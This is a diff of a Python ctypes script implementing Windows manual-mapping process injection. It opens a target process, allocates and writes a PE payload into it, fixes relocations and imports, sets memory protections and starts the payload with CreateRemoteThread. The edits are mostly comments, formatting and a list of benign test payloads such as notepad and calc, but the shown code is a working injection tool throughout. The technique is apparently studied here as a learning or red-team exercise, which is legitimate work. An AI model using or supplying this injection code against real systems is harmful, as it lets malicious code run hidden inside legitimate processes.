@@ -10,16 +10,17 @@ Notes:
 - similar payload(s) to Process Hollowing, except removal of TerminateProcess() or ExitThread() from source
 - this ensures the target process still runs normally
 
-Caution:
-- apparently 'classic' Manual Mapping uses CreateRemoteThread() for execution
-- given its complexity, this seems a little backwards -> better to use Thread Hijacking or something else
 
 Steps:
 ------
 - Select PID/process
 - Allocate memory                       -> VirtualAllocEx()
 - Write payload into allocated memory   -> WriteProcessMemory()
-- Apply fixes                           -> Base Relocations / IAT fixing / Apply Memory Protections
+
+Apply fixes
+- Base Relocations
+- IAT fixing
+
 - Execute payload                       -> CreateRemoteThread()
 """
 
@@ -37,7 +38,16 @@ kernel32    = ctypes.WinDLL('kernel32.dll', use_last_error=True)
 # ----------------------------------
 # Payloads - sample(s)
 # ----------------------------------
-payload = r"C:\simple_file.exe"
+
+#payload = r"c:\windows\system32\win32calc.exe"
+#payload = r"c:\windows\system32\notepad.exe"
+#payload = r"C:\Users\spaz\Desktop\CODE\simple_loop.exe"
+#payload = r"C:\Users\spaz\Desktop\CODE\simple_msg.exe"
+#payload = r"C:\Users\spaz\Desktop\CODE\simple_naked.exe"
+#payload = r"C:\Users\spaz\Desktop\CODE\simple_sleep.exe"
+#payload = r"C:\Users\spaz\Desktop\CODE\simple_msg_lazy.exe"
+#payload = r"C:\Users\spaz\Desktop\CODE\simple_beep.exe"
+payload = r"C:\Users\spaz\Desktop\CODE\simple_file.exe"
 
 # ----------------------------------
 # CONSTANTS - functions
@@ -218,7 +228,6 @@ kernel32.GetProcAddress.argtypes = [
 ]
 kernel32.GetProcAddress.restype = ctypes.c_void_p
 
-
 kernel32.LoadLibraryA.argtypes = [
     wintypes.LPCSTR,        # lpLibFileName
 ]
@@ -244,7 +253,6 @@ kernel32.ReadProcessMemory.argtypes = [
     ctypes.POINTER(ctypes.c_size_t),    # [o] lpNumberOfBytesRead
 ]
 kernel32.ReadProcessMemory.restype = wintypes.BOOL
-
 
 kernel32.VirtualAllocEx.argtypes = [
     wintypes.HANDLE,        # hProcess
@@ -289,7 +297,6 @@ def winerr() -> OSError:
     """ Return a ctypes.WinError() with the last Windows API error """
     return ctypes.WinError(ctypes.get_last_error())
 
-
 def close_handle(handle: wintypes.HANDLE, name: str="Handle") -> None:
     """ Close open handles, to avoid resource leaks """
     print(f"[+] Closing Handle to {name}: ", end='', flush=True)
@@ -303,11 +310,9 @@ def close_handle(handle: wintypes.HANDLE, name: str="Handle") -> None:
     else:
         print(f"Successful ({handle.value})")
 
-
 def key_sort(name: str) -> str:
     """ Ensure processes sorted alphabetically, regardless of case """
     return name.casefold()
-
 
 def pause() -> None:
     """ Pause until user key press (any) """
@@ -418,8 +423,7 @@ def get_number_of_sections_in_section_table(f: object) -> int:
 
 def group_pids_by_process() -> tuple[
             defaultdict[str, list[int]],
-            dict[int, str]
-]:
+            dict[int, str]]:
     """
     Snapshot taken of running processes -> TH32CS_SNAPPROCESS
     - iterated by Process32FirstW -> Process32NextW, until empty
@@ -511,10 +515,10 @@ def validate_pid(pid: int, pid_map: dict[int, str]) -> bool:
     process_name = pid_map.get(pid)
 
     if process_name:
-        print(f"[+] PID found -> '{process_name}'")
+        print(f"    PID found -> '{process_name}'")
         return True
     else:
-        print(f"[!] Error: PID {pid} not found in snapshot")
+        print(f"\n[!] Error: PID {pid} not found in snapshot")
         return False
 
 
@@ -540,7 +544,6 @@ def open_process(
 # ------------------- Allocate Memory ---------------------
 #
 # allocate_memory()
-
 
 def allocate_memory(
     hProcess: wintypes.HANDLE,
@@ -758,7 +761,7 @@ def write_payload_sections(
             else:
                 # ----- Fix Mode: apply memory protections -----
 
-                # assign and appyl memory protection
+                # assign and apply memory protection
                 protection = assign_memory_protection(characteristics)
 
                 old_protect = wintypes.DWORD(0)
@@ -769,7 +772,7 @@ def write_payload_sections(
                     protection,
                     ctypes.byref(old_protect)
                 ):
-                    print(f"    [!] Warning: Failed to set protection for section {current_section_name}: {winerr()}")
+                    print(f"\n[!] Failed to set protection -> '{current_section_name}': {winerr()}")
 
                 else:
                     prot_names = {
@@ -1101,7 +1104,6 @@ def base_relocations(
 
 
 # --------------------- IAT Fixing ----------------------
-
 def iat_fix_read_ascii_string(f: object , file_offset: int) -> tuple[str, bytes]:
     """ read a null-terminated ASCII string, from a given file offset """
     
@@ -1362,7 +1364,6 @@ def create_execute_thread(hProcess: wintypes.HANDLE, actual_entry_point_va: int)
     return wintypes.HANDLE(hThread)
 
 
-
 # ------------------------------------------------------
 #               Context Manager(s)
 # ------------------------------------------------------
@@ -1428,9 +1429,10 @@ with open(payload, 'rb') as f:
     print("\n\n# ----------------- PHASE: Execution -----------------")
     payload_entry_point_rva = get_payload_entry_point_rva(f)
     actual_entry_point_va = actual_base_address_va + payload_entry_point_rva
-    hThread = create_execute_thread(hProcess, actual_entry_point_va)
+    print(f"    -> absolute entry point: {hex(actual_entry_point_va)}")
 
     # wait for thread to actually execute
+    hThread = create_execute_thread(hProcess, actual_entry_point_va)
     kernel32.WaitForSingleObject(hThread, wintypes.DWORD(-1))  # INFINITE
 
 
